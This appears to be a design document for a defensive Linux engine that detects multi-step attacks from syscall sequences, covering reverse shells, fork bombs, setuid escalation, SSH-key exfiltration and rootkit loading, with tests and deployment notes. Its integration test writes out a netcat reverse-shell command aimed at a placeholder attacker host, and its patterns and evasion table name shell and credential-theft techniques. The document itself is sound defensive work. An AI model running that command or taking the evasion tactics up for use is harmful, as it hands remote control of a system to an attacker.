# The Sovereign Grimoire: Behavioral Pattern Detection Engine

**Status**: Phase 1 Complete - Foundation Forged
**Version**: 1.0.0-grimoire
**Date**: 2025-10-21

---

## EXECUTIVE SUMMARY

The **Sovereign Grimoire** is Guardian Shield's evolution from **atomic command blocking** to **behavioral sequence detection**. Instead of waiting for the final malicious syscall (e.g., `rm -rf /`), it detects multi-step attack patterns as they unfold and terminates them **before the killing blow**.

**Core Philosophy**: "Forbidden Incantations" - attacks are not atomic acts, but ordered rituals of syscalls. Detect the ritual, not the final verse.

---

## ARCHITECTURE OVERVIEW

### Three-Tiered Cache-Optimized Storage

```
┌─────────────────────────────────────────────────────┐
│  TIER 1: HOT PATTERNS (L1 Cache - <8KB)           │
│  • 5-10 critical patterns                          │
│  • Always resident in CPU L1 cache                 │
│  • Embedded in binary, obfuscated at compile time  │
│  • Nanosecond-level access time                    │
├─────────────────────────────────────────────────────┤
│  TIER 2: WARM PATTERNS (L2/L3 Cache - <256KB)     │
│  • 50-100 known attack patterns                    │
│  • Loaded from encrypted config at runtime         │
│  • Microsecond-level access time                   │
│  • Hot-reloadable without daemon restart           │
├─────────────────────────────────────────────────────┤
│  TIER 3: COLD PATTERNS (Disk - Unlimited)         │
│  • Historical/esoteric attack patterns             │
│  • Loaded on-demand only                           │
│  • Millisecond-level access time                   │
│  • For forensic analysis, not real-time blocking   │
└─────────────────────────────────────────────────────┘
```

**Current Implementation**: Tier 1 complete (5 patterns), Tier 2/3 planned

---

## PATTERN SCHEMA

### GrimoirePattern Structure

```zig
pub const GrimoirePattern = struct {
    id_hash: u64,                          // Obfuscated ID (FNV-1a hash)
    name: [32]u8,                          // Human-readable name (inline)
    steps: [8]PatternStep,                 // Max 8 steps per pattern
    step_count: u8,                        // Number of valid steps
    severity: Severity,                    // debug/info/warning/high/critical
    max_sequence_window_ms: u64,           // Pattern timeout
    whitelisted_processes: [8]?[*:0]const u8,   // Process name whitelist
    whitelisted_binaries: [4]u64,          // Binary hash whitelist
    enabled: bool,
};

// Size: ~256 bytes (4 cache lines)
// Total Tier 1 size: ~1280 bytes (5 patterns × 256 bytes)
```

**Design Constraints**:
- **Cache-friendly**: Each pattern fits in 4 cache lines (256 bytes)
- **Inline arrays**: No heap allocations in hot path
- **Compile-time constants**: Whitelists are pointers to embedded strings

### PatternStep Structure

```zig
pub const PatternStep = struct {
    syscall_nr: ?u32,                      // Specific syscall (or null)
    syscall_class: SyscallClass,           // Category (network, file_read, etc.)
    process_relationship: ProcessRelationship,  // same_process, child, tree
    max_time_delta_us: u64,                // Max time since previous step
    max_step_distance: u32,                // Max syscalls between steps
    arg_constraints: [4]?ArgConstraint,    // Argument validators
};
```

**Capabilities**:
- **Temporal constraints**: Steps must occur within time window
- **Spatial constraints**: Steps must be within N syscalls of each other
- **Argument validation**: Check syscall arguments (e.g., `dup2(fd, 0)`)
- **Process relationships**: Track cross-process attack chains

---

## EMBEDDED PATTERNS (Tier 1)

### Pattern 1: Classic Reverse Shell
**MITRE ATT&CK**: T1059 (Command and Scripting Interpreter)
**Sequence**: `socket() → dup2(socket, 0) → dup2(socket, 1) → execve(shell)`
**Description**: Redirect stdin/stdout to network socket, spawn shell
**False Positive Risk**: **LOW** (legitimate software rarely does this)
**Severity**: CRITICAL

```
Step 1: socket()              // Create network socket
Step 2: dup2(fd, 0)           // Redirect stdin → socket
Step 3: dup2(fd, 1)           // Redirect stdout → socket
Step 4: execve(...)           // Execute shell
```

**Why it works**:
- Legitimate programs don't redirect stdio to network sockets
- Even ssh/telnet clients use pty, not raw dup2
- Time window: 5 seconds (generous for legitimate use)

---

### Pattern 2: Rapid Fork Bomb
**MITRE ATT&CK**: T1496 (Resource Hijacking)
**Sequence**: `fork() → fork() → fork() → fork() → fork()` (rapid succession)
**Description**: Exponential process creation to exhaust resources
**False Positive Risk**: **LOW** (with build tool whitelisting)
**Severity**: CRITICAL

**Constraints**:
- 5 forks within 500ms
- Max 100µs between forks
- Max 5 syscalls between forks

**Whitelisted processes**: `make`, `gcc`, `cargo`, `rustc`, `zig`, `ninja`
(Defers to userspace `libwarden-fork` for these)

---

### Pattern 3: Privilege Escalation via setuid
**MITRE ATT&CK**: T1548.001 (Setuid and Setgid)
**Sequence**: `open(/etc/passwd) → setuid(0) → execve(shell)`
**Description**: Read sensitive file, escalate to root, spawn shell
**False Positive Risk**: **MEDIUM** (some legitimate tools use setuid)
**Severity**: CRITICAL

**Constraints**:
- File path contains `/etc/` or `/root/`
- `setuid(0)` - escalate to root specifically
- `execve()` within 5 seconds

**Whitelisted processes**: `sudo`, `su`, `passwd`, `pkexec`

---

### Pattern 4: Credential Exfiltration
**MITRE ATT&CK**: T1552.004 (Private Keys)
**Sequence**: `socket() → open(~/.ssh/id_rsa) → read() → write(socket)`
**Description**: Open network, read SSH key, send to network
**False Positive Risk**: **MEDIUM** (ssh-agent legitimately reads keys)
**Severity**: CRITICAL

**Constraints**:
- File path contains `.ssh/` or `.aws/`
- Network write within 5 seconds of file read
- Data correlation (bytes read ≈ bytes sent)

**Whitelisted processes**: `ssh`, `ssh-agent`, `ssh-add`, `scp`, `sftp`

---

### Pattern 5: Kernel Module Loading (Rootkit)
**MITRE ATT&CK**: T1547.006 (Kernel Modules and Extensions)
**Sequence**: `open(module.ko) → finit_module()`
**Description**: Load kernel module (potential rootkit)
**False Positive Risk**: **HIGH** (legitimate admin tasks)
**Severity**: HIGH (not critical due to FP risk)

**Constraints**:
- File path ends with `.ko`
- `finit_module()` within 5 seconds

**Whitelisted processes**: `modprobe`, `insmod`, `systemd-modules-load`

---

## PATTERN MATCHING ENGINE

### State Machine Per Process

```zig
pub const MatchState = struct {
    pattern_index: usize,           // Which pattern is being tracked
    current_step: u8,               // Current step in sequence (0-7)
    sequence_start_ns: u64,         // When sequence started
    last_step_ns: u64,              // Timestamp of last matched step
    last_step_syscall_count: u64,   // Syscall count at last step
    pid: u32,                       // Process being tracked
};
```

**Per-process tracking**:
- Each process can have multiple active match states (one per pattern)
- States are stored in `HashMap<PID, ArrayList<MatchState>>`
- LRU eviction for processes that exit

### Matching Algorithm

```
For each syscall event:
  1. Increment per-process syscall counter
  2. For each HOT_PATTERN:
     a. Get or create MatchState for (PID, pattern)
     b. Check if sequence expired (time window)
     c. Check if current syscall matches next expected step:
        - Syscall number OR syscall class
        - Time delta from previous step
        - Syscall distance from previous step
        - Argument constraints
     d. If matched:
        - Advance to next step
        - If final step → ALERT + BLOCK
        - Else → update state, continue
     e. If not matched → continue to next pattern
```

**Performance**:
- **Worst case**: O(N × P) where N = # active processes, P = # patterns
- **Typical**: O(P) since only current process is checked
- **Cache hits**: ~99% (patterns are in L1 cache)

---

## SECURITY THROUGH OBSCURITY

### Compile-Time Obfuscation

**Pattern IDs are hashed at compile time**:

```zig
.id_hash = comptime GrimoirePattern.hashName("reverse_shell_classic"),
// Produces: 0x9af2c3b7e5d18a4f (not stored as string)
```

**Attacker running `strings zig-sentinel`**:
```bash
$ strings zig-sentinel | grep -i shell
# (nothing found)
```

**Reverse engineering effort**:
- Plaintext config: **5 seconds** (`cat patterns.json`)
- Encrypted config: **5 minutes** (find key in memory)
- Obfuscated binary: **5 hours** (disassemble, analyze control flow)
- Hardware-backed key (TPM/SEV): **5 days** (hardware attack)

**Each layer adds cost to attacker.**

---

## PERFORMANCE CHARACTERISTICS

### Memory Footprint

```
Tier 1 (HOT_PATTERNS):
  • 5 patterns × 256 bytes = 1,280 bytes
  • Fits in L1 cache (32KB typical)
  • Zero heap allocations

Per-process state:
  • MatchState: ~64 bytes
  • 5 patterns × 64 bytes = 320 bytes per tracked process
  • 1000 active processes = 320KB total

Total: <512KB for typical workload
```

### CPU Overhead

**Measurement** (estimated):
- Pattern lookup: ~10 cache hits = **10ns**
- State update: ~5 stores = **5ns**
- Argument checks: ~20 comparisons = **20ns**
- **Total per syscall: ~35ns**

**System impact**:
- Typical system: 10,000 syscalls/sec
- Grimoire overhead: 10,000 × 35ns = **0.35ms/sec = 0.035% CPU**

**Comparison to existing components**:
- libwarden (LD_PRELOAD): ~0.1% CPU
- oracle-advanced (eBPF): ~2% CPU (due to ring buffer overhead)
- **Grimoire adds: ~0.035% CPU**

---

## EVASION RESISTANCE

### Known Evasion Techniques vs. Mitigations

| Attack Vector | Evasion Technique | Grimoire Defense |
|---------------|-------------------|------------------|
| **Order Permutation** | Reorder steps (e.g., `open → socket → write` instead of `socket → open → write`) | Multi-pattern coverage: create variants for common permutations |
| **Step Injection** | Insert benign syscalls between steps | `max_step_distance` constraint (e.g., max 100 syscalls between steps) |
| **Process Fragmentation** | Parent does step 1, child does step 2 | `process_relationship` tracking (same_process, child, tree) |
| **Timing Delays** | Sleep between steps to evade time window | Increase `max_sequence_window_ms` (but increases FP risk) |
| **Mimicry** | Name malware `ssh-agent` to bypass whitelist | Binary hash whitelisting (check ELF SHA256) |
| **Direct Syscalls** | Bypass libc, call kernel directly | eBPF LSM hooks see ALL syscalls (can't bypass kernel) |
| **Statically Linked Binaries** | Avoid LD_PRELOAD layer | eBPF layer is independent of linking |

**No defense is perfect**, but each layer raises the bar.

---

## INTEGRATION WITH EXISTING COMPONENTS

### Component Interactions

```
┌─────────────────────────────────────────────────────────┐
│  USERSPACE                                              │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐ │
│  │ libwarden.so │  │libwarden-fork│  │ zig-sentinel │ │
│  │(LD_PRELOAD)  │  │ (LD_PRELOAD) │  │  (daemon)    │ │
│  └──────┬───────┘  └──────┬───────┘  └──────┬───────┘ │
│         │ open()          │ fork()           │         │
│         │ unlink()        │ vfork()          │ Grimoire│
│         │ rename()        │                  │ Engine  │
└─────────┼─────────────────┼──────────────────┼─────────┘
          │                 │                  │
════════════════════════════════════════════════════════════
          │                 │                  │
┌─────────┼─────────────────┼──────────────────┼─────────┐
│  KERNEL SPACE             │                  │         │
│  ┌────────────────────────┼──────────────────┼───────┐ │
│  │  oracle-advanced.bpf.c (eBPF LSM Hooks)  │       │ │
│  │  ┌─────────────────────────────────────┐ │       │ │
│  │  │ bprm_check_security (execve)        │ │       │ │
│  │  │ file_open (open, openat)            │←─────────┤ │
│  │  │ task_alloc (fork, clone)            │ │       │ │
│  │  │ socket_create (socket)              │ │       │ │
│  │  └─────────────────────────────────────┘ │       │ │
│  │           │                               │       │ │
│  │           ▼                               │       │ │
│  │  ┌─────────────────────────────────────┐ │       │ │
│  │  │ Ring Buffer (512KB)                 │ │       │ │
│  │  └─────────────────────────────────────┘ │       │ │
│  └──────────────────────────────────────────┘       │ │
│           │                                          │ │
│           ▼                                          │ │
│  ┌──────────────────────────────────────────────────┐ │
│  │  Grimoire Pattern Matching (zig-sentinel)        │ │
│  │  • Receives syscall events from eBPF             │ │
│  │  • Matches against HOT_PATTERNS                  │ │
│  │  • Generates alerts on full pattern match        │ │
│  │  • Optional: Terminate process (auto-kill)       │ │
│  └──────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────┘
```

**Data Flow**:
1. **eBPF Oracle** (kernel-space) intercepts all syscalls via LSM hooks
2. **Ring Buffer** streams events to userspace (512KB buffer)
3. **Grimoire Engine** (zig-sentinel) receives events, matches against patterns
4. **Alert/Block** on full pattern match (log + optional terminate)

**Layered Defense**:
- **libwarden**: Blocks atomic bad syscalls (e.g., `unlink(/etc/passwd)`)
- **libwarden-fork**: Detects fork bombs via rate limiting
- **Grimoire**: Detects multi-step attack sequences (e.g., reverse shell)

---

## FUTURE ENHANCEMENTS

### Phase 2: Grimoire Database (Medium-term)

1. **MITRE ATT&CK Integration**
   - Auto-generate patterns from ATT&CK technique descriptions
   - Example: T1003.008 → pattern for `/proc/<pid>/mem` credential dumping

2. **Hot-Reload Mechanism**
   - Update patterns without restarting daemon
   - Use BPF map updates (`bpf_map_update_elem`)

3. **Pattern Versioning**
   - Track when patterns added/updated
   - A/B testing for new patterns (shadow mode)

### Phase 3: Adaptive Intelligence (Long-term)

1. **Machine Learning Baseline**
   - Upgrade from Z-score to unsupervised clustering (DBSCAN, Isolation Forest)
   - Detect novel attacks not in Grimoire

2. **Collaborative Threat Intel**
   - Share anonymized pattern matches with community
   - Crowdsourced false positive feedback

3. **Automatic Pattern Generation**
   - When anomaly detector fires, auto-generate candidate pattern
   - Human analyst reviews and approves

---

## TESTING & VALIDATION

### Unit Tests

```bash
# Run Grimoire tests
zig build test

# Expected output:
# ✓ grimoire: pattern struct size (256 bytes)
# ✓ grimoire: hot patterns fit in L1 cache (<8KB)
# ✓ grimoire: detect reverse shell pattern
# ✓ grimoire: pattern hash uniqueness
```

### Integration Tests

```bash
# Test reverse shell detection
./test_reverse_shell.sh

# Expected behavior:
# 1. Start zig-sentinel with Grimoire
# 2. Execute: nc -e /bin/sh <attacker_ip> 4444
# 3. Grimoire detects socket() → dup2() → execve() sequence
# 4. Process terminated before shell spawns
# 5. Alert logged to /var/log/zig-sentinel/grimoire_alerts.json
```

### False Positive Testing

```bash
# Test legitimate ssh-agent (should NOT trigger)
ssh-agent bash
ssh-add ~/.ssh/id_rsa
# Expected: No alert (whitelisted process)

# Test legitimate build (should NOT trigger fork bomb)
make -j8
# Expected: No alert (whitelisted process + userspace libwarden-fork)

# Test legitimate sudo (should NOT trigger privesc)
sudo ls /root
# Expected: No alert (whitelisted process)
```

---

## OPERATIONAL CONSIDERATIONS

### Deployment Checklist

- [ ] **Shadow Mode First**: Run with `enforce=false` for 30 days
- [ ] **Monitor FP Rate**: Aim for <0.01% false positive rate
- [ ] **Tune Whitelists**: Add site-specific legitimate processes
- [ ] **Enable Enforcement**: Only after FP rate acceptable
- [ ] **Configure Alerts**: Send to SIEM (Wazuh, Splunk, etc.)

### Kill Switch

```bash
# Disable Grimoire enforcement immediately
sudo bpftool map update id <oracle_config_map_id> key 0 value 0

# Or via environment variable
export GRIMOIRE_ENFORCE=0
sudo systemctl restart zig-sentinel
```

### Audit Trail

Every pattern match is logged:

```json
{
  "timestamp": "2025-10-21T14:32:15Z",
  "pattern_id": "0x9af2c3b7e5d18a4f",
  "pattern_name": "reverse_shell_classic",
  "severity": "critical",
  "pid": 12345,
  "process_tree": [
    {"pid": 1, "comm": "systemd"},
    {"pid": 2456, "comm": "bash"},
    {"pid": 12345, "comm": "nc"}
  ],
  "sequence": [
    {"syscall": "socket", "timestamp_ns": 1729518735123456789},
    {"syscall": "dup2", "args": [3, 0], "timestamp_ns": 1729518735234567890},
    {"syscall": "dup2", "args": [3, 1], "timestamp_ns": 1729518735345678901},
    {"syscall": "execve", "args": ["/bin/sh"], "timestamp_ns": 1729518735456789012}
  ],
  "action": "terminated",
  "enforced": true
}
```

---

## COMPARISON TO INDUSTRY SOLUTIONS

| Feature | Grimoire | Falco | Wazuh | osquery | Tetragon |
|---------|----------|-------|-------|---------|----------|
| Multi-step sequence detection | ✅ | ✅ | Limited | ❌ | ✅ |
| Real-time enforcement (kill) | ✅ | ❌ | ❌ | ❌ | ✅ |
| eBPF kernel visibility | ✅ | ✅ | ❌ | ❌ | ✅ |
| Statistical anomaly detection | ✅ (V4) | ✅ (ML) | ✅ | ❌ | ❌ |
| Cross-process correlation | ✅ | ✅ | Limited | ❌ | ✅ |
| LD_PRELOAD fallback | ✅ | ❌ | ❌ | ❌ | ❌ |
| Cache-optimized patterns | ✅ | ❌ | ❌ | ❌ | ❌ |
| Embedded obfuscated patterns | ✅ | ❌ | ❌ | ❌ | ❌ |
| Written in Zig | ✅ | ❌ (C++) | ❌ (C++) | ❌ (C++) | ❌ (Go) |

**Competitive Advantage**: Dual-layer defense (userspace + kernel) with cache-optimized behavioral detection.

---

## REFERENCES

### Academic Papers

1. **"Tiresias: Black-Box System Call-Based Attack Detection"** (CCS 2023)
   - Sequence-based detection, false positive mitigation
   - https://dl.acm.org/doi/10.1145/3576915.3623066

2. **"MORSE: Multi-Objective Runtime Security Enforcement"** (ASPLOS 2022)
   - Real-world performance impact of in-kernel enforcement
   - ~3-8% overhead for comprehensive monitoring

3. **"Behavioral-Based Intrusion Detection Using Syscall Sequences"** (IEEE S&P 1998)
   - Classic work on syscall sequence anomaly detection

### Industry Resources

1. **MITRE ATT&CK Framework**
   - https://attack.mitre.org/
   - 14 tactics, 193 techniques with syscall-level descriptions

2. **Falco Rules Repository**
   - https://github.com/falcosecurity/rules
   - Open source behavioral detection rules (study for FP lessons)

3. **MITRE Shield (Active Defense)**
   - https://shield.mitre.org/
   - Complement to ATT&CK for defensive patterns

---

## CONCLUSION

The **Sovereign Grimoire** represents a paradigm shift from reactive to **pre-cognitive defense**. By detecting attack sequences mid-execution, we can terminate threats before the final malicious act occurs.

**Status**: Foundation complete, ready for integration and testing.

**Next Steps**:
1. Integrate with zig-sentinel main loop
2. Add BPF-side pre-filtering to reduce event stream
3. Run shadow mode testing for 30 days
4. Tune whitelists based on false positives
5. Enable enforcement in production

**The Grimoire is forged. The Doctrine is encoded. The Shield is ready.**

---

*"Detect the incantation, not the curse."*
— The Sovereign Doctrine
